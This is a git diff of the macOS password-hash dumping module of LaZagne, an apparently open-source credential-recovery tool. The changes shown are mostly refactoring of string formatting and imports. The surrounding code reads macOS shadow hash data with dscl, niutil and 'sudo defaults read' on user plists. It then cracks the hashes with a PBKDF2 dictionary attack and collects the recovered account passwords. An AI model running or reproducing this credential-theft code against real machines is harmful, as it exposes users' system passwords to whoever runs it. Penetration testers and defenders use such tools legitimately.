@@ -1,4 +1,5 @@
-# -*- coding: utf-8 -*-
+# -*- coding: utf-8 -*- 
+#!/usr/bin/python
 
 # Inspired from :
 # https://apple.stackexchange.com/questions/220729/what-type-of-hash-are-a-macs-password-stored-in
@@ -6,7 +7,7 @@
 
 # TO DO: retrieve hash on mac os Lion without need root access: https://hackademics.fr/forum/hacking-connaissances-avancées/unhash/1098-mac-os-x-python-os-x-lion-password-cracker 
 from lazagne.config.write_output import print_debug
-from lazagne.config.moduleInfo import ModuleInfo
+from lazagne.config.module_info import ModuleInfo
 from lazagne.config.dico import get_dico
 from lazagne.config.constant import *
 from xml.etree import ElementTree
@@ -19,8 +20,7 @@ import os
 
 class Hashdump(ModuleInfo):
 	def __init__(self):
-		options = {'command': '-hashdump', 'action': 'store_true', 'dest': 'hashdump', 'help': 'System hash'}
-		ModuleInfo.__init__(self, 'hashdump', 'system', options)
+		ModuleInfo.__init__(self, 'hashdump', 'system')
 
 		self.username 	= None
 		self.iterations = None
@@ -79,11 +79,11 @@ class Hashdump(ModuleInfo):
 	# this technic works only for OS X 10.3 and 10.4
 	def get_user_hash_using_niutil(self, username):
 		# get guid
-		cmd 	= 'niutil -readprop . /users/%s generateduid' % username
+		cmd 	= 'niutil -readprop . /users/{username} generateduid'.format(username=username)
 		guid 	= self.run_cmd(cmd)
 		if guid:
 			guid = guid.strip()	
-			print_debug('INFO', 'GUID found : %s ' % guid)
+			print_debug('INFO', 'GUID found : {guid}'.format(guid=guid))
 			
 			# get hash
 			hash = self.get_hash_using_guid(guid)
@@ -95,11 +95,11 @@ class Hashdump(ModuleInfo):
 	# this technic works only for OS X 10.5 and 10.6
 	def get_user_hash_using_dscl(self, username):
 		# get guid
-		cmd 	= 'dscl localhost -read /Search/Users/%s | grep GeneratedUID | cut -c15-' % username
+		cmd 	= 'dscl localhost -read /Search/Users/{username} | grep GeneratedUID | cut -c15-'.format(username=username)
 		guid 	= self.run_cmd(cmd)
 		if guid:
 			guid = guid.strip()	
-			print_debug('INFO', 'GUID found : %s ' % guid)
+			print_debug('INFO', 'GUID found : {guid}'.format(guid=guid))
 			
 			# get hash
 			hash = self.get_hash_using_guid(guid)
@@ -111,7 +111,7 @@ class Hashdump(ModuleInfo):
 	# this technic works only for OS X >= 10.8
 	def get_user_hash_from_plist(self, username):
 		try:
-			cmd = 'sudo defaults read /var/db/dslocal/nodes/Default/users/%s.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null' % username
+			cmd = 'sudo defaults read /var/db/dslocal/nodes/Default/users/{username}.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null'.format(username=username)
 			raw = self.run_cmd(cmd)
 
 			if len(raw) > 100:
@@ -131,11 +131,11 @@ class Hashdump(ModuleInfo):
 				self.entropyhex = entropyhex
 
 				return '{username}:$ml${iterations}${salt}${entropy}'.format(
-																				username=username, 
-																				iterations=iterations, 
-																				salt=salthex, 
-																				entropy=entropyhex
-																			)
+					username=username, 
+					iterations=iterations, 
+					salt=salthex, 
+					entropy=entropyhex
+				)
 		except Exception as e:
 			print_debug('ERROR', e)
 			pass
@@ -151,12 +151,12 @@ class Hashdump(ModuleInfo):
 					print_debug('INFO', 'Trying word: %s' % word)
 					if str(self.entropyhex) == str(self.dictionary_attack_pbkdf2(str(word), binascii.unhexlify(self.salthex), self.iterations)):
 						constant.system_pwd.append(
-														{
-															'Account': 	username, 
-															'Password': word
-														}
-													)
-						print_debug('INFO', 'Password found: %s' % word)
+							{
+								'Account': 	username, 
+								'Password': word
+							}
+						)
+						print_debug('INFO', 'Password found: {word}'.format(word=word))
 						found = True
 						break
 		except (KeyboardInterrupt, SystemExit):
@@ -181,14 +181,14 @@ class Hashdump(ModuleInfo):
 			major, minor = self.check_version()
 			if major == 10 and (minor == 3 or minor == 4):
 				for user in self.list_users(): 
-					print_debug('INFO', 'User found: %s' % user)
+					print_debug('INFO', 'User found: {user}'.format(user=user))
 					userhash = self.get_user_hash_using_niutil(user)
 					if userhash: 
 						userhashes.append(userhash)
 
 			if major == 10 and (minor == 5 or minor == 6):
 				for user in self.list_users(): 
-					print_debug('INFO', 'User found: %s' % user)
+					print_debug('INFO', 'User found: {user}'.format(user=user))
 					userhash = self.get_user_hash_using_dscl(user)
 					if userhash: 
 						userhashes.append(userhash)
